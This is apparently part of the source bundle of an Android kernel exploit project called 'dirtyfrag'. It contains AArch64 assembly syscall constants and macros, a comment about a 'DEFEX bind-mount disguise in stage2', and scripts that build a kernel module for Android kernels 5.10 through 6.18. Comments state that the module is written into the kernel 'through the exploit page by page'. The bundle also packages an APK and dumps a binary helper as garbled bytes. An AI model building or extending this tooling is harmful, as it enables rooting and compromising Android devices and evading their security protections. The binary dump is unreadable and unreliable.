+  // sched.h
+  .equ CSIGNAL,              0x000000FF // signal mask to be sent at exit
+  .equ CLONE_VM,             0x00000100 // set if VM shared between processes
+  .equ CLONE_FS,             0x00000200 // set if fs info shared between processes
+  .equ CLONE_FILES,          0x00000400 // set if open files shared between processes
+  .equ CLONE_SIGHAND,        0x00000800 // set if signal handlers and blocked signals shared
+  .equ CLONE_PTRACE,         0x00002000 // set if we want to let tracing continue on the child too
+  .equ CLONE_VFORK,          0x00004000 // set if the parent wants the child to wake it up on mm_release
+  .equ CLONE_PARENT,         0x00008000 // set if we want to have the same parent as the cloner
+  .equ CLONE_THREAD,         0x00010000 // Same thread group?
+  .equ CLONE_NEWNS,          0x00020000 // New mount namespace group
+  .equ CLONE_SYSVSEM,        0x00040000 // share system V SEM_UNDO semantics
+  .equ CLONE_SETTLS,         0x00080000 // create a new TLS for the child
+  .equ CLONE_PARENT_SETTID,  0x00100000 // set the TID in the parent
+  .equ CLONE_CHILD_CLEARTID, 0x00200000 // clear the TID in the child
+  .equ CLONE_DETACHED,       0x00400000 // Unused, ignored
+  .equ CLONE_UNTRACED,       0x00800000 // set if the tracing process can't force CLONE_PTRACE
+  .equ CLONE_CHILD_SETTID,   0x01000000 // set the TID in the child
+  .equ CLONE_NEWCGROUP,      0x02000000 // New cgroup namespace
+  .equ CLONE_NEWUTS,         0x04000000 // New utsname namespace
+  .equ CLONE_NEWIPC,         0x08000000 // New ipc namespace
+  .equ CLONE_NEWUSER,        0x10000000 // New user namespace
+  .equ CLONE_NEWPID,         0x20000000 // New pid namespace
+  .equ CLONE_NEWNET,         0x40000000 // New network namespace
+  .equ CLONE_IO,             0x80000000 // Clone io context
+
+  // fcntl.h
+  .equ O_ACCMODE, 00000003
+  .equ O_RDONLY,  00000000
+  .equ O_WRONLY,  00000001
+  .equ O_RDWR,    00000002
+  .equ O_CREAT,   00000100
+  .equ O_EXCL,    00000200
+  .equ O_NOCTTY,  00000400
+  .equ O_TRUNC,   00001000
+  .equ O_APPEND,  00002000
+  .equ O_NONBLOCK,00004000
+  .equ O_CLOEXEC, 02000000
+
+  .equ SHUT_RDWR,            2
+
+  .equ STDIN_FILENO,         0
+  .equ STDOUT_FILENO,        1
+  .equ STDERR_FILENO,        2
+
+  .equ AF_UNIX,              1
+  .equ AF_INET,              2
+  .equ SOCK_STREAM,          1
+  .equ SOCK_DGRAM,           2
+  .equ SOCK_CLOEXEC,   0x80000
+  .equ IPPROTO_IP,           0
+
+  // epoll.h
+  .equ EPOLLIN,              0x001
+  .equ EPOLLPRI,             0x002
+  .equ EPOLLOUT,             0x004
+  .equ EPOLLERR,             0x008
+  .equ EPOLLHUP,             0x010
+  .equ EPOLLRDNORM,          0x040
+  .equ EPOLLRDBAND,          0x080
+  .equ EPOLLWRNORM,          0x100
+  .equ EPOLLWRBAND,          0x200
+  .equ EPOLLMSG,             0x400
+
+  .equ EPOLLEXCLUSIVE,       1 << 28
+  .equ EPOLLWAKEUP,          1 << 29
+  .equ EPOLLONESHOT,         1 << 30
+  .equ EPOLLET,              1 << 31
+
+  .equ EPOLL_CTL_ADD,        1
+  .equ EPOLL_CTL_DEL,        2
+  .equ EPOLL_CTL_MOD,        3
+
+  // Linux/AArch64 system calls
+  .equ SYS_epoll_create1,   20
+  .equ SYS_epoll_ctl,       21
+  .equ SYS_epoll_pwait,     22
+  .equ SYS_dup3,            24
+  .equ SYS_fcntl,           25
+  .equ SYS_mount,           40
+  .equ SYS_statfs,          43
+  .equ SYS_faccessat,       48
+  .equ SYS_chroot,          51
+  .equ SYS_fchmodat,        53
+  .equ SYS_openat,          56
+  .equ SYS_close,           57
+  .equ SYS_pipe2,           59
+  .equ SYS_read,            63
+  .equ SYS_write,           64
+  .equ SYS_writev,          66
+  .equ SYS_pselect6,        72
+  .equ SYS_ppoll,           73
+  .equ SYS_splice,          76
+  .equ SYS_exit,            93
+  .equ SYS_waitid,          95
+  .equ SYS_unshare,         97
+  .equ SYS_futex,           98
+  .equ SYS_kill,           129
+  .equ SYS_reboot,         142
+  .equ SYS_setuid,         146
+  .equ SYS_setsid,         157
+  .equ SYS_uname,          160
+  .equ SYS_clock_gettime,   113
+  .equ SYS_getpid,         172
+  .equ SYS_getppid,        173
+  .equ SYS_getuid,         174
+  .equ SYS_getgid,         176
+  .equ SYS_gettid,         178
+  .equ SYS_socket,         198
+  .equ SYS_bind,           200
+  .equ SYS_listen,         201
+  .equ SYS_accept,         202
+  .equ SYS_connect,        203
+  .equ SYS_sendto,         206
+  .equ SYS_recvfrom,       207
+  .equ SYS_setsockopt,     208
+  .equ SYS_getsockopt,     209
+  .equ SYS_shutdown,       210
+  .equ SYS_munmap,         215
+  .equ SYS_clone,          220
+  .equ SYS_execve,         221
+  .equ SYS_mmap,           222
+  .equ SYS_mprotect,       226
+  .equ SYS_wait4,          260
+  .equ SYS_getrandom,      278
+  .equ SYS_memfd_create,   279
+  .equ SYS_access,        1033
+  .equ SYS_init_module,    105
+  .equ SYS_lseek,           62
+  .equ SYS_readlinkat,      78
+  .equ SYS_finit_module,   273
+  .equ SYS_ioctl,           29
+
+  .equ EAGAIN,              11
+  .equ SEEK_DATA,            3
+  .equ MAP_SHARED,         0x1
+  .equ MAP_PRIVATE,        0x2
+  .equ PROT_READ,          0x1
+  .equ PROT_WRITE,         0x2
+  .equ PROT_EXEC,          0x4
+
+  // mount.h (for the DEFEX bind-mount disguise in stage2)
+  .equ MS_BIND,            4096
+  .equ MS_REC,            16384
+  .equ MS_PRIVATE,       262144
+
+  // load a 64-bit immediate using MOV
+  .macro movq Xn, imm
+      movz    \Xn,  \imm & 0xFFFF
+      movk    \Xn, (\imm >> 16) & 0xFFFF, lsl 16
+      movk    \Xn, (\imm >> 32) & 0xFFFF, lsl 32
+      movk    \Xn, (\imm >> 48) & 0xFFFF, lsl 48
+  .endm
+
+  // load a 32-bit immediate using MOV
+  .macro movl Wn, imm
+      movz    \Wn,  \imm & 0xFFFF
+      movk    \Wn, (\imm >> 16) & 0xFFFF, lsl 16
+  .endm
+
+  // simulate a push operation
+  .macro push Rn:req
+      str     \Rn, [sp, -16]
+  .endm
+
+  // simulate a pop operation
+  .macro pop R:req
+      ldr     \Rn, [sp], 16
+  .endm
+
+// Save x0 to filename for debugging.
+.macro debug filename
+    stp x0, x1, [sp, #-16]!
+    stp x2, x3, [sp, #-16]!
+    stp x4, x5, [sp, #-16]!
+    stp x6, x7, [sp, #-16]!
+    stp x8, x9, [sp, #-16]!
+    stp x26, x27, [sp, #-16]!
+    stp x28, x29, [sp, #-16]!
+    str x30, [sp, #-16]!
+
+    mov x26, x0
+
+    mov x0, -100
+    adr x1, \filename
+    movl x2, (O_CREAT|O_EXCL|O_CLOEXEC|O_WRONLY)
+    mov x3, (0777)
+    mov x8, #SYS_openat
+    svc 0
+
+    mov x27, x0
+
+    str x26, [sp, #-32]
+    sub x1, sp, 32
+    movl x2, 8
+    mov x8, #SYS_write
+    svc 0
+
+    mov x0, x27
+    mov x8, #SYS_close
+    svc 0
+
+    ldr x30, [sp], #16
+    ldp x28, x29, [sp], #16
+    ldp x26, x27, [sp], #16
+    ldp x8, x9, [sp], #16
+    ldp x6, x7, [sp], #16
+    ldp x4, x5, [sp], #16
+    ldp x2, x3, [sp], #16
+    ldp x0, x1, [sp], #16
+.endm
+
+.macro create_mark filename
+    mov x0, -100
+    adr x1, \filename
+    movl x2, (O_CREAT|O_EXCL|O_CLOEXEC)
+    mov x3, xzr
+    mov x8, #SYS_openat
+    svc 0
+.endm
+
+============================================================
+
+FILE: ./build.sh
+============================================================
+#!/bin/sh
+
+set -eu
+cd "$(dirname "$0")"
+
+./gradlew :app:assembleRelease
+cp app/build/outputs/apk/release/dirtyfrag.apk ./dirtyfrag.apk
+ls -l ./dirtyfrag.apk
+echo "OK: ./dirtyfrag.apk"
+
+============================================================
+
+FILE: ./dirtyfrag-lkm/build.sh
+============================================================
+#!/bin/bash
+
+set -euo pipefail
+
+ENGINE="${ENGINE:-podman}"
+
+if [[ -n "${ANDROID_NDK_ROOT:-}" ]]; then
+    LLVM_OBJCOPY="$ANDROID_NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objcopy"
+else
+    LLVM_OBJCOPY="llvm-objcopy"
+fi
+
+cd "$(dirname "$0")"
+
+for version in \
+    android12-5.10 \
+    android13-5.10 \
+    android13-5.15 \
+    android14-5.15 \
+    android15-6.6  \
+    android16-6.12 \
+    android17-6.18 \
+; do
+    "$ENGINE" run --rm --pid=host --network=none \
+        -v "$(pwd)":/src -w /src \
+        ghcr.io/ylarod/ddk-min:"$version" \
+        make "$@"
+    cp dirtyfrag.ko dirtyfrag-"$version".ko
+    # Size diet: this ko is written through the exploit page by page.
+    # --strip-unneeded keeps only load-relevant symbols (undefined imports etc.);
+    # the -R removals drop loader-ignored sections. Removing the empty .hyp.*
+    # sections also repacks the file, reclaiming ~2.2 KiB of alignment padding.
+    # (13.4 KiB -> ~7.8 KiB, i.e. 4 pages -> 2 pages.)
+    "$LLVM_OBJCOPY" --strip-unneeded \
+      -R .comment -R .note.gnu.build-id -R .note.gnu.property -R .note.Linux -R .note.GNU-stack \
+      -R .BTF -R .BTF.base -R .llvm_addrsig \
+      -R .hyp.text -R .hyp.bss -R .hyp.rodata -R .hyp.event_ids \
+      -R .hyp.patchable_function_entries -R .hyp.data \
+      dirtyfrag-"$version".ko
+
+    mv dirtyfrag-"$version".ko ../app/src/main/jni/ko/dirtyfrag-"$version".ko
+    echo "==============================="
+    echo "Compiled $version LKM"
+    echo "==============================="
+    echo ""
+done
+rm dirtyfrag.ko
+
+============================================================
+
+FILE: ./source.sh
+============================================================
+#!/bin/bash
+
+# Script to concatenate all .xml, .kt, and .java files into a single text file
+# Usage: ./concat_source.sh [output_file]
+
+OUTPUT_FILE="${1:-source_code.txt}"
+SEPARATOR="============================================================"
+
+echo "Starting source code concatenation..."
+echo "Output file: $OUTPUT_FILE"
+rm -f "$OUTPUT_FILE"
+
+echo "SOURCE CODE CONCATENATION" > "$OUTPUT_FILE"
+echo "Generated on: $(date)" >> "$OUTPUT_FILE"
+echo "Files included: .xml, .kt, .java" >> "$OUTPUT_FILE"
+echo "$SEPARATOR" >> "$OUTPUT_FILE"
+echo "" >> "$OUTPUT_FILE"
+
+# Counter for files processed
+file_count=0
+
+# Function to process files
+process_files() {
+    local pattern="$1"
+    local files
+    files=$(find . -name "$pattern" -type f | grep -v "/build/" | grep -v "/.git/")
+
+    while IFS= read -r file; do
+        if [[ -n "$file" && -f "$file" ]]; then
+            echo "Processing: $file"
+            echo "FILE: $file" >> "$OUTPUT_FILE"
+            echo "$SEPARATOR" >> "$OUTPUT_FILE"
+            cat "$file" >> "$OUTPUT_FILE"
+            echo "" >> "$OUTPUT_FILE"
+            echo "$SEPARATOR" >> "$OUTPUT_FILE"
+            echo "" >> "$OUTPUT_FILE"
+            ((file_count++))
+        fi
+    done <<< "$files"
+}
+
+# Process each file type
+process_files "*.xml"
+process_files "*.kt"
+process_files "*.java"
+process_files "*.kts"
+process_files "*.h"
+process_files "*.txt"
+process_files "*.c"
+process_files "*.S"
+process_files "*.inc"
+process_files "*.sh"
+process_files "Makefile"
+process_files "splicehelper"
+# Add summary
+echo "" >> "$OUTPUT_FILE"
+echo "SUMMARY" >> "$OUTPUT_FILE"
+echo "$SEPARATOR" >> "$OUTPUT_FILE"
+echo "Total files processed: $file_count" >> "$OUTPUT_FILE"
+echo "File types: XML, Kotlin, Java" >> "$OUTPUT_FILE"
+
+echo "Completed! Processed $file_count files."
+echo "Output saved to: $OUTPUT_FILE"
+
+============================================================
+
+FILE: ./dirtyfrag-lkm/Makefile
+============================================================
+obj-m += dirtyfrag.o
+
+# Size diet: this ko is written through the exploit page by page,
+# so every byte counts. -Os shrinks code; dropping unwind tables kills
+# .eh_frame (unused for modules).
+CFLAGS_dirtyfrag.o := -Os -fno-asynchronous-unwind-tables -fno-unwind-tables
+
+all:
+	$(MAKE) -C $(KDIR) M=$(CURDIR) \
+		ARCH=arm64 \
+		LLVM=1 \
+		modules
+
+clean:
+	$(MAKE) -C $(KDIR) M=$(CURDIR) \
+		ARCH=arm64 \
+		LLVM=1 \
+		clean
+
+.PHONY: all clean
+
+============================================================
+
+FILE: ./app/src/main/jni/splicehelper
+============================================================
+ELF          ·    (      @       P          @ 8  @         @       @       @       à       à                                            "      "                   $      $      $                         Qåtd                                                   r   ÿÑý{©ýÃ‘ ƒø¨ƒ_ø@ù¨C¸¨ƒ_ø! ‘¨ƒø¨ƒ^ø @ùk  ” ø¨ƒ^ø	@ù¨ƒø¨C_¸ qË  T  ¨ƒ^ø@ùè ù  èªè ù  è@ù¨ø¡ƒ]ø`€’âª€Òl  ”è *¨Ã¸¨Ã\¸È ø6    €ÒÁ€Òg  ”  ¨]øè ´   ]ø ÕÁyÿb  ”  4   Ãœ¸¡^øâªÃ€ÒU  ” Ãœ¸á³ ‘€Òã€ÒP  ”à ùè@ùA ñÀ  T    €ÒÁ€ÒK  ”  áªàª" €ÒÃ€ÒB  ”t ±À  T  ` €ÒÁ€Ò?  ”  á³ ‘àª€Ò€Ò6  ”à ùê@ùI €Rè*JA ñ	‰è	* }@“Á€Ò/  ”   Ãœ¸¡ƒ Ñ% €Òâªãª€Ò†	€ÒS  ”à ùè@ùA ñéŸè	* }@“Á€Ò  ”ý{G©ÿ‘À_ÖÿC Ñà ùÿ ù  è@ù@9È 4  è@ùI€Ò}	›é@ù)@9)Á qÁ)‹è ùè@ù ‘è ùñÿÿà@ùÿC ‘À_Öèª  ÔÀ_Öèª  ÔÀ_Öÿƒ Ñà ùá ù  è@ù@9	 €Ré ¹ 4  è@ù@9	 €Ré ¹H 4  è@ù@9é@ù)@9	kèŸè ¹  è@¹( 6  è@ù ‘è ùè@ù ‘è ùãÿÿè@ù@9é@ù)@9	kàŸÿƒ ‘À_Öèª  ÔÀ_Öà ‘>ÿÿ .text .shstrtab .rodata                                                                              2                                                               $      $                                                         0                                    
+============================================================
+
+
+SUMMARY
+============================================================
+Total files processed: 48
+File types: XML, Kotlin, Java
